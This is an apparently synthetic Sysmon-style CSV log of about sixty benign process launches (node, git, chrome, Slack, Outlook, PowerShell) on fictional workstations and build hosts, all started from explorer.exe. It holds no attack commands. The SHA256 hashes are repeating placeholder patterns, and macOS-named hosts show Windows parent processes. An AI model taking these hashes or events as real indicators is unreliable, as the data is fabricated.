UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-09 00:00:00.000,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0014b964f0240c460014b964f0240c460014b964f0240c460014b964f0240c46
2026-03-09 00:11:33.839,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0009a3d654fb25020009a3d654fb25020009a3d654fb25020009a3d654fb2502
2026-03-09 00:15:23.238,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0007a50d221328db0007a50d221328db0007a50d221328db0007a50d221328db
2026-03-09 00:28:24.962,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001f4825c42bea03001f4825c42bea03001f4825c42bea03001f4825c42bea03
2026-03-09 00:31:54.445,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007c3757449e5ed0007c3757449e5ed0007c3757449e5ed0007c3757449e5ed
2026-03-09 00:45:49.308,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=000f7104afc7862b000f7104afc7862b000f7104afc7862b000f7104afc7862b
2026-03-09 00:56:37.228,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00019677d8fc22b100019677d8fc22b100019677d8fc22b100019677d8fc22b1
2026-03-09 01:06:48.164,MAC-DEV-04,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00024a6481b5e76300024a6481b5e76300024a6481b5e76300024a6481b5e763
2026-03-09 01:18:36.793,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00157988a989a02300157988a989a02300157988a989a02300157988a989a023
2026-03-09 01:26:34.411,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0003a4c9c5a731690003a4c9c5a731690003a4c9c5a731690003a4c9c5a73169
2026-03-09 01:39:28.085,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00149bf34adb865c00149bf34adb865c00149bf34adb865c00149bf34adb865c
2026-03-09 01:54:21.006,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001e74e460e4b08d001e74e460e4b08d001e74e460e4b08d001e74e460e4b08d
2026-03-09 02:07:12.691,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0012890a3bb1707c0012890a3bb1707c0012890a3bb1707c0012890a3bb1707c
2026-03-09 02:18:01.308,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0003e494e09c74330003e494e09c74330003e494e09c74330003e494e09c7433
2026-03-09 02:21:46.736,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001cebbd7d7e1316001cebbd7d7e1316001cebbd7d7e1316001cebbd7d7e1316
2026-03-09 02:31:24.005,MAC-DEV-04,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0014d19d731a18080014d19d731a18080014d19d731a18080014d19d731a1808
2026-03-09 02:40:30.673,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000c2d04af14bf82000c2d04af14bf82000c2d04af14bf82000c2d04af14bf82
2026-03-09 02:54:10.054,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b8f86dd7c1001001b8f86dd7c1001001b8f86dd7c1001001b8f86dd7c1001
2026-03-09 03:06:25.951,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b34ec239a968b000b34ec239a968b000b34ec239a968b000b34ec239a968b
2026-03-09 03:12:32.318,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=0018000ee3cd329d0018000ee3cd329d0018000ee3cd329d0018000ee3cd329d
2026-03-09 03:15:36.928,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=001b28599cd4bf45001b28599cd4bf45001b28599cd4bf45001b28599cd4bf45
2026-03-09 03:27:19.191,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017ff123b988e100017ff123b988e100017ff123b988e100017ff123b988e10
2026-03-09 03:34:52.678,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001db04b3f7b7b13001db04b3f7b7b13001db04b3f7b7b13001db04b3f7b7b13
2026-03-09 03:39:20.188,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=00174ebb7c5fa03000174ebb7c5fa03000174ebb7c5fa03000174ebb7c5fa030
2026-03-09 03:47:56.370,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001608742cbf062d001608742cbf062d001608742cbf062d001608742cbf062d
2026-03-09 03:52:23.039,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b143145881e66001b143145881e66001b143145881e66001b143145881e66
2026-03-09 04:02:03.406,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0002489200d2ec1f0002489200d2ec1f0002489200d2ec1f0002489200d2ec1f
2026-03-09 04:07:46.938,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000255dfd0cd69ea000255dfd0cd69ea000255dfd0cd69ea000255dfd0cd69ea
2026-03-09 04:11:37.209,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0022988019bc62140022988019bc62140022988019bc62140022988019bc6214
2026-03-09 04:21:34.118,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a542021fee617001a542021fee617001a542021fee617001a542021fee617
2026-03-09 04:26:17.237,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000cde843cdb64f3000cde843cdb64f3000cde843cdb64f3000cde843cdb64f3
2026-03-09 04:41:10.438,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000969ea60ee799a000969ea60ee799a000969ea60ee799a000969ea60ee799a
2026-03-09 04:49:31.204,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021b6168f2457940021b6168f2457940021b6168f2457940021b6168f245794
2026-03-09 04:57:24.153,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001d6de49141e0c8001d6de49141e0c8001d6de49141e0c8001d6de49141e0c8
2026-03-09 05:07:56.364,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013913d795fbd950013913d795fbd950013913d795fbd950013913d795fbd95
2026-03-09 05:18:28.994,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=000f2bdf7572ee5c000f2bdf7572ee5c000f2bdf7572ee5c000f2bdf7572ee5c
2026-03-09 05:32:16.786,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=00236a77e1d8019c00236a77e1d8019c00236a77e1d8019c00236a77e1d8019c
2026-03-09 05:37:12.078,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000a4ad41d10b972000a4ad41d10b972000a4ad41d10b972000a4ad41d10b972
2026-03-09 05:42:58.637,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0002fc63c0330a040002fc63c0330a040002fc63c0330a040002fc63c0330a04
2026-03-09 05:47:27.591,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007dc9af745d27a0007dc9af745d27a0007dc9af745d27a0007dc9af745d27a
2026-03-09 05:52:07.237,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013c3af1b1a45480013c3af1b1a45480013c3af1b1a45480013c3af1b1a4548
2026-03-09 06:03:22.502,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e1d2d18e53e6b000e1d2d18e53e6b000e1d2d18e53e6b000e1d2d18e53e6b
2026-03-09 06:17:41.911,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=0006871f67a3dfac0006871f67a3dfac0006871f67a3dfac0006871f67a3dfac
2026-03-09 06:22:59.434,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0021e7bbf11cf6920021e7bbf11cf6920021e7bbf11cf6920021e7bbf11cf692
2026-03-09 06:31:21.128,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=000aea80f1628df1000aea80f1628df1000aea80f1628df1000aea80f1628df1
2026-03-09 06:39:13.058,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0018bd95210454a10018bd95210454a10018bd95210454a10018bd95210454a1
2026-03-09 06:43:14.852,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b21b3b4f4d518001b21b3b4f4d518001b21b3b4f4d518001b21b3b4f4d518
2026-03-09 06:46:28.710,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00069199562ff5f600069199562ff5f600069199562ff5f600069199562ff5f6
2026-03-09 06:55:47.170,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0010cfc61c0485810010cfc61c0485810010cfc61c0485810010cfc61c048581
2026-03-09 07:07:04.068,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019a9d46d238e270019a9d46d238e270019a9d46d238e270019a9d46d238e27
2026-03-09 07:12:43.898,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007e8e457dc4fe70007e8e457dc4fe70007e8e457dc4fe70007e8e457dc4fe7
2026-03-09 07:25:15.526,BLD-RUN-02,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002c3092ed9a8590002c3092ed9a8590002c3092ed9a8590002c3092ed9a859
2026-03-09 07:33:30.702,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001f0ecfa7057d0a001f0ecfa7057d0a001f0ecfa7057d0a001f0ecfa7057d0a
2026-03-09 07:42:58.981,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013d4e39c03c7f50013d4e39c03c7f50013d4e39c03c7f50013d4e39c03c7f5
2026-03-09 07:52:01.065,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f65542b38f503000f65542b38f503000f65542b38f503000f65542b38f503
2026-03-09 07:58:18.951,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=00007426142584a900007426142584a900007426142584a900007426142584a9
2026-03-09 08:05:43.986,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00184c9d0a60799900184c9d0a60799900184c9d0a60799900184c9d0a607999
2026-03-09 08:19:19.006,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f0abf479872ea001f0abf479872ea001f0abf479872ea001f0abf479872ea
